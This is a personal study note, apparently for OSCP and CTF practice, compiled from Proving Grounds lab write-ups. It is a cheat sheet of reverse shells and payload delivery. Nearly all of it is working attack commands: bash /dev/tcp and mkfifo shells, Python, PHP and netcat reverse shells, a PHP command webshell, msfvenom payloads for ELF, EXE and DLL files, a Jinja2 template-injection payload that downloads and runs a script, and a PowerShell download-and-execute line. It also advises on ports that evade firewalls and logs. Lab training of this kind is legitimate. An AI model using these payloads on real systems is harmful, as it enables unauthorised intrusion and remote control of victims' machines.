---
title: "Reverse Shell Reference — All Languages and Methods"
created: "2026-04-11"
updated: "2026-04-11"
type: permanent-note
status: active
tags:
  - permanent-note
  - reverse-shell
  - exploitation
  - initial-foothold
  - oscp
related:
  - "[[File-Upload-Filter-Bypass-Techniques]]"
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
  - "[[SSTI-Jinja2-Exploitation]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# Reverse Shell Reference — All Languages and Methods

**Core idea:** A reverse shell is the goal of nearly every initial exploitation. The target connects back to you, bypassing firewall rules that block inbound connections. Having multiple shell types memorized (or close to hand) lets you adapt instantly when one method fails.

**Before you start:** Always set up your listener first.
```bash
nc -lvnp PORT       # netcat listener (standard)
rlwrap nc -lvnp PORT  # with readline history (better for interactive)
```

---

## Bash Reverse Shells

```bash
# Standard bash reverse shell
bash -c 'bash -i >& /dev/tcp/KALI_IP/PORT 0>&1'

# URL-encoded version (for injection in URLs)
bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/PORT+0>%261'

# Using mkfifo (reliable — works when others don't)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP PORT >/tmp/f

# The /dev/tcp trick
exec 5<>/dev/tcp/KALI_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

## Python Reverse Shells

```python
# Python 3 (most common on modern Linux)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'

# From Djinn3 writeup — full multiline form
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("KALI_IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
pty.spawn("sh")
```

---

## PHP Reverse Shells

```php
# One-liner webshell (for LFI + file upload attacks)
<?php system($_GET['cmd']); ?>

# Full PHP reverse shell (pentest monkey — most reliable)
# Download: https://github.com/pentestmonkey/php-reverse-shell
# Edit: $ip and $port variables

# PHP one-liner reverse shell
php -r '$sock=fsockopen("KALI_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Critical for CTF:** File upload bypass tricks for PHP shells — see [[File-Upload-Filter-Bypass-Techniques]]

---

## Netcat Reverse Shells

```bash
# Classic netcat
nc -e /bin/bash KALI_IP PORT

# If nc doesn't support -e (Busybox/OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI_IP PORT >/tmp/f

# Windows netcat
nc.exe -e cmd.exe KALI_IP PORT
```

**From PG writeups:** Netcat binary transfer to Windows target (Access box):
```powershell
# After getting RCE, transfer nc.exe and run
Invoke-RunasCs svc_mssql password 'C:\xampp\htdocs\uploads\nc.exe KALI_IP 4444 -e cmd.exe'
```

---

## Shell Upgrade to Full TTY (Critical Step!)

Raw netcat shells are fragile — Ctrl+C kills the shell, no tab completion, no arrow keys. Always upgrade:

```bash
# After getting a shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
python -c 'import pty; pty.spawn("/bin/bash")'

# Then on Kali: Ctrl+Z to background
stty raw -echo; fg

# Then in shell:
export TERM=xterm
stty rows 40 cols 160
```

---

## msfvenom — Generating Staged/Stageless Payloads

```bash
# Linux reverse shell (ELF binary)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f elf -o shell.elf

# Windows reverse shell (exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f exe -o shell.exe

# Windows DLL (from Access writeup — DLL hijacking)
msfvenom -f dll -a x64 -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=9090 -o Printconfig.dll

# PHP webshell
msfvenom -p php/reverse_php LHOST=KALI_IP LPORT=PORT -f raw -o shell.php

# Windows staged shellcode (for buffer overflow)
msfvenom -p windows/shell/reverse_tcp LHOST=KALI_IP LPORT=PORT EXITFUNC=thread -f c
```

**Metasploit handler for staged payloads:**
```bash
use exploit/multi/handler
set payload windows/shell/reverse_tcp  # (or linux/x64/shell_reverse_tcp)
set LHOST KALI_IP
set LPORT PORT
set EXITFUNC thread
exploit -j   # background as a job
```

---

## SSTI Reverse Shell (Jinja2/Werkzeug)

```
# From Djinn3 — SSTI payload to download and execute reverse shell
{{config.__class__.__init__.__globals__['os'].popen('wget http://KALI_IP:8000/shell.py -O /tmp/s.py && python3 /tmp/s.py').read()}}
```
See [[SSTI-Jinja2-Exploitation]] for full context.

---

## File Transfer to Victim (Deliver the Shell)

```bash
# Python HTTP server on Kali (serve the shell)
python3 -m http.server 8000

# On victim — download the shell
wget http://KALI_IP:8000/shell.elf
curl -O http://KALI_IP:8000/shell.php

# Transfer via Netcat
# Kali: nc -lvnp 1234 < shell.elf
# Victim: nc KALI_IP 1234 > shell.elf

# PowerShell (Windows)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')
```

---

## Port Selection Advice

- Use **4444** (standard metasploit default) — easy to remember
- Use **443** or **80** — most firewalls allow outbound traffic on these
- Use **1234** — short, commonly used in CTF writeups
- Avoid high ports like 65535 — can look suspicious in logs

---

## Connections

- [[File-Upload-Filter-Bypass-Techniques]] — uploading PHP shells via web
- [[LFI-to-RCE-Log-Poisoning-Pattern]] — delivering shell via log poisoning
- [[SSTI-Jinja2-Exploitation]] — shell via template injection
- [[SMB-Enumeration-Exploitation]] — writable SMB share → shell upload
- [[FTP-Exploitation-Techniques]] — writable FTP → shell upload
- [[Advanced-Linux-PrivEsc-Patterns]] — once shell obtained, escalate

---

*Extracted from 70+ Proving Grounds writeups (PG Play + PG Practice, 2023–2024)*
